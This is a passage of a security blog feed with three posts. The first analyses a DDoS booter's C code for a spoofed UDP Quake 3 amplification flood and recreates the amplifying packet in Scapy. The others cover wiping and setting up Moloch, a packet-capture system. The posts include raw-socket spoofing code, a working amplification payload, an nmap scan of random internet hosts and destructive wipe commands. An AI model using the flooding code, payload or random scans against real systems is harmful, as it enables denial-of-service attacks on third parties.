udph-&gt;dest = htons(destport);

/*
As specified at rfc768: "Length is the length in octets of this user datagram including this header
and the data. (This  means  the minimum value of the length is eight.)"

Above is UDP length computed withoud having in mind UDP payload, so it will be wrong, DPI and protocol 
anomaly detection are more than welcome ;)

Additionally, specifying a bad UDP length have an important side effect in this flooder, it won't work
because upper layers are not going to receive correct payload, in this case quake3 server will answer
with a disconnect command instead of server' status, so no amplification
*/
udph-&gt;len = htons(sizeof(struct udphdr));

/*
As specified at rfc768: "An all zero  transmitted checksum  value means that the transmitter
generated  no checksum  (for debugging or for higher level protocols that don't care)."

could be useful sometimes when defining attacking patterns
*/
udph-&gt;check = 0;

strncpy((char *)udph + sizeof (struct udphdr),message, 4096 - (sizeof (struct udphdr) + sizeof (struct ip)));

int one = 1;
const int *val = &amp;one;
if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) &lt; 0)
{
    printf ("[x] Cannot set socket options (are we r00t?)\n");
    return;
}

if (sendto (s, packet, iph-&gt;tot_len, 0, (struct sockaddr *) &amp;sin, sizeof (sin)) &lt; 0)
    printf ("[x] Error sending packet\n");

close(s);
return;
</code></pre>

<p>}
```</p>

<p>There isn't much more to say about this, just highlight the fact that using htonl() instead of htons() avoid us using fixed IP ID value when finding an attack pattern. Also found interesting the specified IP ToS value to mess around with congestion detection and avoidance mechanisms, but contrasts with some mistakes that make easier to spot attacking datagrams generated by this tool and, even more unvelievable, incorrect UDP length transform amplification attack just in a plain UDP spoofed attack (probably made some copy paste from here and there), seems some guys need to read a bit about network protocols before playing with DDoS tools...</p>

<h2>Crafting Quake 3 amplification attack packet with Scapy</h2>

<p>Probably the quick and easiest way to craft packets when doing network tests is <a href="http://www.secdev.org/projects/scapy/">Scapy</a>, a python tool to create and manipulate network packets that can be used within his own interactive shell or just as a python package.</p>

<p>Below is an example for crafting this kind of attack with scapy, without spoofing IP address (we want to check answer) and with a correct UDP length value and checksum (scapy will automagically compute values like length and checksum prior of sending any packet):<br/>
``` python crafting Quake 3 amplification attack packet with scapy</p>

<h1>scapy</h1>

<blockquote><blockquote><blockquote><p>import random</p>

<p>ip = IP(dst="QUAKE3_SERVER_IP", ihl=5, tos=0x10, ttl=255, id=random.randint(0, 0xFFFF))
udp = UDP(sport=32511, dport=27960)
quake3_payload = '\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10'
packet = ip/udp/quake3_payload # encapsulate them
packet.show2()</p>

<h3>[ IP ]</h3>

<p>  version= 4L
  ihl= 5L
  tos= 0x10
  len= 42
  id= 5944
  flags=
  frag= 0L
  ttl= 255
  proto= udp
  chksum= 0xe0a9
  src= 192.168.1.39
  dst= QUAKE3_SERVER_IP
  \options\</p>

<h3>[ UDP ]</h3>

<pre><code> sport= 32511
 dport= 27960
 len= 22
 chksum= 0x17f9
</code></pre>

<h3>[ Raw ]</h3>

<pre><code>    load= '\xff\xff\xff\xffgetstatus\x10'
</code></pre>

<p>response = sr1(packet)
Begin emission:
Finished to send 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets</p>

<p>response.payload.payload.show2()</p>

<h3>[ Raw ]</h3>

<p>  load= '\xff\xff\xff\xffstatusResponse\n\sv_allowdownload\0\g_matchmode\0\g_gametype\3\sv_maxclients\32\sv_floodprotect\1\capturelimit\0\[...]\n0 0 "Chuck-Norris"\n0 250 "b0b0"[...]</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>If you have never used scapy before take a look to this <a href="http://code.google.com/p/scapy-guide/downloads/list">scapy-guide</a> made by <a href="https://twitter.com/catalyst256/">Adam Maxwell</a>, it's really useful as a first-steps guide.</p>

<h2>How does it looks like at network level?</h2>

<p>Ok, so we have readed flooder code and referenced rfc sections (because we did, right? ;) ), time to sniff some attack traffic and analyze it with tshark/wireshark and observe described behaviour pattern.</p>

<p>First, i have compiled and used "dns.c" flooder without making any kind of modification, this is a Wireshak screenshot while analyzing it:<br/>
<img src="/images/upload/2013/06/incorrectlength_client.png"></p>

<p>I have marked in red important aspects like ToS/DS field, UDP length/checksum and "direction" (for Quake 3 protocol). As shown, Wireshark Quake 3 protocol <a href="http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-quake3.c">dissector</a> itself detect it as a malformed packet, due to UDP length = 8 application layer will receive an empty payload, fact that the Q3 server will treat as a client with connectivity errors and will send a "disconnect" message:<br/>
<img src="/images/upload/2013/06/incorrectlength_server.png"></p>

<p>If we compare question size against response answer there is no amplification factor at all, this program would be useful only for provoking Q3 servers sending unsolicited traffic to a third host - the attacked one - with the intention of splitting originating AS-path attacking or something similar.</p>

<p>I have sent one "getstatus" request forged with scapy to a public Quake 3 server (for obvious reasons i have changed some response content):<br/>
<img src="/images/upload/2013/06/statusResponse.png"></p>

<p>The server now correctly decode UDP payload, process "getstatus" command and answer with server status, including several server options and config values as well as statistics (a response size of 1373 bytes for a 56 bytes request).</p>

<h2>Next steps</h2>

<p>So far we have seen how this attack works as well as (bad coded) programs being used in the wild to launch DDoS attacks from web panels (the so called DDoS booters). We have also seen how to replay the amplification attack with Scapy and analized a bit of this network traffic with Wireshark.</p>

<p>At the next post we are going to see how to mitigate this kind of attack at the Quake 3 server - at application and network layer - side and also from the victim side being flooded. Also we are going to analyze it deeper with tshark to see potential ways to spot this attack and try to block it.</p>

<p>See you at next post!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Moloch: Erasing data and restore database]]></title>
    <link href="http://blog.alejandronolla.com/2013/05/29/moloch-erasing-data-and-restore-database/"/>
    <updated>2013-05-29T13:31:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/05/29/moloch-erasing-data-and-restore-database</id>
    <content type="html"><![CDATA[<p>This post is just a quick tip for restoring moloch state (database and pcap data) to have a superb fresh installed moloch system. I have received and email asking for this, so maybe it could be useful for someone. If you don't know what moloch is take a look to his <a href="https://github.com/aol/moloch">github</a> and my previous <a href="http://blog.alejandronolla.com/2013/04/06/moloch-capturing-and-indexing-network-traffic-in-realtime/">post</a> to know more about this powerful network traffic capturer and indexer distributed system. <!-- more --></p>

<h2>Restoring elasticsearch schema and indexed data</h2>

<p>First, we need to erase indexed data and, optionally, also user data, to do this moloch includes a perl script for managing database:
``` bash moloch database management options
~/moloch/db# ./db.pl</p>

<p>Missing arguments</p>

<p>./db.pl &lt;ESHOST:ESPORT> <command> [<options>]</p>

<p>Commands:
  init                  - Clear ALL elasticsearch moloch data and create schema
  wipe                  - Same as init, but leaves user database untouched
  upgrade               - Upgrade Moloch's schema in elasticsearch from previous versions
  usersexport <fn>      - Save the users info to <fn>
  usersimport <fn>      - Load the users info from <fn>
  rotate <type> <num>   - Perform daily maintenance</p>

<pre><code>   type             - Same as rotateIndex in ini file = daily,weekly,monthly
   num              - number indexes to keep
</code></pre>

<p>```</p>

<p>So, if we want to restore database state - users included - we have to do the following:
``` bash restoring moloch's elastic search data
~/moloch/db# ./db.pl ELASTICSEARCH_IP:9200 init
It is STRONGLY recommended that you stop ALL moloch captures and viewers before proceeding.</p>

<p>There is 1 elastic search node, if you expect more please fix first before proceeding.</p>

<p>It appears this elastic search cluster already has moloch installed, this will delete ALL data in elastic search! (It does not delete the pcap files on disk.)</p>

<p>Type "INIT" to continue - do you want to erase everything?
INIT
Erasing
Creating
Finished.  Have fun!
```</p>

<p>Now elastic search only have basic schema (with users database restored); to know more about what db.pl have done take a look to his source code:
``` perl moloch database management source code
if ($ARGV[1] =~ /(init|wipe)/) {</p>

<pre><code>if ($ARGV[1] eq "init" &amp;&amp; $main::versionNumber &gt;= 0) {
    print "It appears this elastic search cluster already has moloch installed, this will delete ALL data in elastic search! (It does not delete the pcap files on disk.)\n\n";
    print "Type \"INIT\" to continue - do you want to erase everything?\n";
    waitFor("INIT");
} elsif ($ARGV[1] eq "wipe") {
    print "This will delete ALL session data in elastic search! (It does not delete the pcap files on disk or user info.)\n\n";
    print "Type \"WIPE\" to continue - do you want to wipe everything?\n";
    waitFor("WIPE");
}
print "Erasing\n";
esDelete("/tags_v2", 1);
esDelete("/tags", 1);
esDelete("/sequence", 1);
esDelete("/files_v3", 1);
esDelete("/files_v2", 1);
esDelete("/files_v1", 1);
esDelete("/files", 1);
esDelete("/stats", 1);
esDelete("/dstats", 1);
esDelete("/dstats_v1", 1);
esDelete("/sessions*", 1);
esDelete("/template_1", 1);
if ($ARGV[1] eq "init") {
    esDelete("/users_v1", 1);
    esDelete("/users_v2", 1);
    esDelete("/users", 1);
}
esDelete("/tagger", 1);

sleep(1);

print "Creating\n";
tagsCreate();
sequenceCreate();
filesCreate();
statsCreate();
dstatsCreate();
sessionsUpdate();
if ($ARGV[1] eq "init") {
    usersCreate();
}
print "Finished.  Have fun!\n";
</code></pre>

<p>```</p>

<h2>Erasing previously captured pcap data</h2>

<p>Done this only remains to remove pcap data from "raw" directory:
<code>bash erasing moloch pcap data
~/moloch/db/raw# rm *
</code></p>

<p>That's all folks, enjoy your fresh baked moloch!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Moloch: Capturing and indexing network traffic in realtime]]></title>
    <link href="http://blog.alejandronolla.com/2013/04/06/moloch-capturing-and-indexing-network-traffic-in-realtime/"/>
    <updated>2013-04-06T00:40:00+02:00</updated>
    <id>http://blog.alejandronolla.com/2013/04/06/moloch-capturing-and-indexing-network-traffic-in-realtime</id>
    <content type="html"><![CDATA[<h2>What is moloch?</h2>

<p>As his own <a href="https://github.com/aol/moloch">website</a> says: <strong><em>"Moloch is an open source, large scale IPv4 packet capturing (PCAP), indexing and database system. A simple web interface is provided for PCAP browsing, searching, and exporting. APIs are exposed that allow PCAP data and JSON-formatted session data to be downloaded directly."</em></strong> it will be very useful as a network forensic tool to analyze captured traffic (moloch can also index previously captured pcap files as we will see) in case of a security incident or detecting some suspicious behaviour like, for example, some kind of alert in our IDS.</p>

<p>Thanks of indexing pcaps with <a href="http://www.elasticsearch.org/">elasticsearch</a>, moloch provide us with the ability to perform almost real-time searches among dozens or hundreds of captured GB network traffic being able to apply several filtering options on the way. It isn't as complete as Wireshark filtering system for example but will save us tons of work when dealing with some filtering and visualization as well as Moloch will provide us with some features Wireshark lacks, like filtering by country or AS.</p>

<p>I'm sure to not be the only who would have loved to rely on moloch when analyzing dozens of GB with tshark and wireshark, particularly each time you apply a filter to show some kind of data...<!-- more --></p>

<h2>Installing moloch</h2>

<p>For deploying a moloch machine in a "all-in-one" setup i created a virtual machine with Ubuntu server 12.10 64bits and assigned about 100GB of HDD, 16GB of RAM and 4 CPU cores, moloch is a highly consuming platform, to have a more detailed info about this go to <a href="https://github.com/aol/moloch#id23">hardware requirements</a>.</p>

<p>First step will be updating the box, installing java and cloning github repository:
``` bash Updating system and cloning repo</p>

<h1>apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install git openjdk-7-jdk openjdk-7-jre -y</h1>

<h1>git clone https://github.com/aol/moloch.git</h1>

<p><code>
Once cloned the repo we must install, at least, one of his components: capture, viewer or elasticsearch. Because we are going to mess up a bit with moloch to get an overview of functionalities and capabilities we will take the shortest path, installing moloch through provided bash script to setup everything in the same machine; if you prefer to install it manually or are going to build a distributed cluster check "[Building and Installing](https://github.com/aol/moloch#id15)":
</code> bash Installing moloch automatically
~/moloch# ./easybutton-singlehost.sh
```
Now the wizard will make us a few questions to configure moloch (capturer, viewer and elasticsearch instance) for us and everything will be running in a few moments (moloch will be installed by default at <em>"/data/moloch/"</em>) and we can access to web interface at <em>"https://MOLOCH_IP_ADDRESS:8005"</em>:<br/>
<img src="/images/upload/2013/04/moloch_fresh_install.png"></p>

<p>As can be seen, moloch have already started to index all traffic seen on eth0, included every request to moloch web interface. If we don't want this then we have to specify a capture filtering in <em><a href="http://en.wikipedia.org/wiki/Berkeley_Packet_Filter">Berkeley Packet Filter (bpf)</a></em> format at <em>"/data/moloch/etc/config.ini"</em>:<br/>
<code>bash Don't index ANY traffic related with moloch box
bpf=not host 192.168.1.39
</code></p>

<p>To change elasticsearch configuration and allow access from other IP address than moloch host itself (it could pose a security risk, using SSH tunneling would be a better aproach) go to <em>"/data/moloch/etc/elasticsearch.yml"</em> and edit network parameters (<em>network.host</em>), to view/change moloch configuration take a look to <em>"/data/moloch/etc/config.ini"</em>:<br/>
``` bash Changing binded IP address</p>

<h1>Set the bind address specifically (IPv4 or IPv6):</h1>

<p>#
network.bind_host: 0.0.0.0</p>

<h1>Set the address other nodes will use to communicate with this node. If not</h1>

<h1>set, it is automatically derived. It must point to an actual IP address.</h1>

<p>#
network.publish_host: 0.0.0.0</p>

<h1>Set both 'bind_host' and 'publish_host':</h1>

<p>#
network.host: 0.0.0.0</p>

<p><code>  
We need to shutdown elasticsearch node and start it again, so here we go:
</code> bash Restarting elasticsearch</p>

<h1>curl -XPOST 'http://localhost:9200/_shutdown'</h1>

<h1>nohup /data/moloch/bin/run_es.sh &amp;</h1>

<p>```<br/>
We can also start viewer and capturer from same dir <em>"/data/moloch/bin/run_viewer.sh"</em> and <em>"/data/moloch/bin/run_capture.sh"</em> respectively.<br/>
Now we have access to <a href="http://mobz.github.com/elasticsearch-head/">elasticsearch-head</a> plugin to see elasticsearch cluster health and manage it at <em>"https://MOLOCH_IP_ADDRESS:9200/_plugin/head/"</em>:<br/>
<img src="/images/upload/2013/04/elasticsearch_head.png"></p>

<h2>Moloch overview</h2>

<p>To have some info indexed by moloch in a few minutes we are going to make some light random nmap scans, having in mind the interface assigned to virtual machine. If you want to use virtual interface and launch nmap scan from moloch box then you could need to change bpf filter to <em>"bpf=not port (9200 or 8005)"</em> (this isn't, by far, the correct way, but will be enough for a quick test).<br/>
``` bash Quick nmap scan to index some HTTP headers</p>

<h1>./nmap -sS -Pn -n -v -p80 -iR 10000 --script=http-headers</h1>

<p>```<br/>
If we take a look again to moloch web interface now we will see some pretty info:<br/>
<img src="/images/upload/2013/04/moloch_scan01.png"></p>

<p>We can see more info about any session clicking on "green plus" icon:<br/>
<img src="/images/upload/2013/04/moloch_scan02.png"></p>

<p>A new dropdown will appear and will give us some interesting options like downloading pcap (for example, to make a deeper manual analysis with wireshark), downloading data in RAW format, and showing use a set of links to make some filtering.</p>

<p>Let's click on "User-Agent link" and then make a search to show only those indexed packets using the NSE user-agent, now you know who have scanned your network with nmap's HTTP plugins in just a second ;).<br/>
<img src="/images/upload/2013/04/moloch_scan03.png"></p>

<p>Moloch also have a useful "stats" menu to have realtime statistics about traffic being captured and indexed:<br/>
<img src="/images/upload/2013/04/moloch_stats.png"></p>

<h2>Indexing previously captured traffic</h2>

<p>To index traffic captured in pcap format we have to use "moloch-capture" stored in <em>"/data/moloch/bin/moloch-capture"</em>:<br/>
``` bash moloch-capture options</p>

<h1>./moloch-capture -h</h1>

<p>Usage:
  moloch-capture [OPTION...] - capture</p>

<p>Help Options:
  -h, --help         Show help options</p>

<p>Application Options:
  -c, --config       Config file name, default '/data/moloch/etc/config.ini'
  -r, --pcapfile     Offline pcap file
  -R, --pcapdir      Offline pcap directory, all *.pcap files will be processed
  --recursive        When in offline pcap directory mode, recurse sub directories
  -n, --node         Our node name, defaults to hostname.  Multiple nodes can run on same host.
  -t, --tag          Extra tag to add to all packets, can be used multiple times
  -v, --version      Show version number
  -d, --debug        Turn on all debugging
  --copy             When in offline mode copy the pcap files into the pcapDir from the config file
  --dryrun           dry run, noting written to database</p>

<p><code>  
I'm going to index a sample of about 7,5GB from a DNS amplification DDoS attack i had to analyze and help to mitigate some months ago, but to quickly download some pcaps to play around NetreseC have a published a good [list](http://www.netresec.com/?page=PcapFiles):  
</code> bash Indexing pcaps from a dir</p>

<h1>./moloch-capture -R /tmp/ddos_pcaps/ --tag ddos --copy</h1>

<p>```<br/>
After some minutes i already had indexed some millions of packets and can view them just searching for tag ddos (i have stripped out map and some info to don't disclose anything about customer / attack):<br/>
<img src="/images/upload/2013/04/ddos_tags.png"></p>

<p>Let's say we want to show every DNS datagram originating from port 53 by servers geolocated at Russia:<br/>
<img src="/images/upload/2013/04/ddos_filtered.png"></p>

<p>As can be seen, there were peaks of almost 60.000 packets per second (DNS answers) with an average of approximately 20.000 at regular intervals in this six minutes slot.</p>

<p>Moloch give us the chance to visualize indexed traffic from a graph's theory point of view ("Connections" tab), using hosts as nodes and connections (with or without port) as edges:<br/>
<img src="/images/upload/2013/04/ddos_connections.png"></p>

<p>This is really useful to get an idea at a glance of what event is being analyzed, in this case we can easily spot few targets and thousands of hosts targeting them.</p>

<h2>Moloch API</h2>

<p>At the beginning of this post i said that Moloch have an API to query and get some info about indexed pcaps and so on in JSON format. At this moment probably the best way to see which calls exists is directly reading the viewer <a href="https://github.com/aol/moloch/blob/master/viewer/viewer.js">code</a>.</p>

<p>There is an example of python code to query moloch API and show some statistics:<br/>
``` python Using moloch API to show some statistics</p>

<h1>!/usr/bin/env python</h1>

<p>import json
import sys
import urllib2</p>

<p>MOLOCH_URL = 'https://192.168.1.39:8005'
MOLOCH_USER = 'admin'
MOLOCH_PASSWORD = 'admin'
MOLOCH_REALM = 'Moloch'</p>

<p>if <strong>name</strong>=='<strong>main</strong>':</p>

<pre><code># Set up authentication
auth_handler = urllib2.HTTPDigestAuthHandler()
auth_handler.add_password(MOLOCH_REALM, MOLOCH_URL, MOLOCH_USER, MOLOCH_PASSWORD)
opener = urllib2.build_opener(auth_handler)

try:
    response = opener.open('%s/esstats.json' % MOLOCH_URL)
    if response.code == 200:
        # Read html response and transform to JSON
        plain_answer = response.read()
        json_data = json.loads(plain_answer)

        # Extract info
        node_name = json_data['aaData'][0]['name']
        documents_num = json_data['aaData'][0]['docs']
        searches_num = json_data['aaData'][0]['searches']
        searches_time_total = json_data['aaData'][0]['searchesTime'] # milliseconds
        store_size_bytes = json_data['aaData'][0]['storeSize'] # bytes

        # Show it
        store_size_mb = store_size_bytes / (1024 * 1024)
        searches_time_average_seconds = float(searches_time_total / searches_num)/1000

        print '[*] Some statistics about elasticsearch at node "%s"' % node_name
        print '   [+] There are %i indexed documents within %i MB of index'\
              % (documents_num, store_size_mb)
        print '   [+] This elasticsearch node has served up %i queries with an average\
        of %f seconds per query' % (searches_num, searches_time_average_seconds)
        print '[-]'

except Exception, e:
    raise e
</code></pre>

<p><code>  
This simple code will show something similar to this:  
</code> bash Output for moloch_api_example.py
$ python moloch_api_example.py
[*] Some statistics about elasticsearch at node "molocha"
   [+] There are 1624416 indexed documents within 963 MB of index
   [+] This elasticsearch node has served up 1042 queries with an average of 0.012000 seconds per query
[-]
```</p>

<p>That is all for now, hope you liked this and find it useful, i think moloch is a really powerful tool and will turn to a must-have in network forensics as well as saving us countless hours when dealing with big amounts of network traffic.</p>

<p>See you soon!</p>
]]></content>
  </entry>
  
</feed>
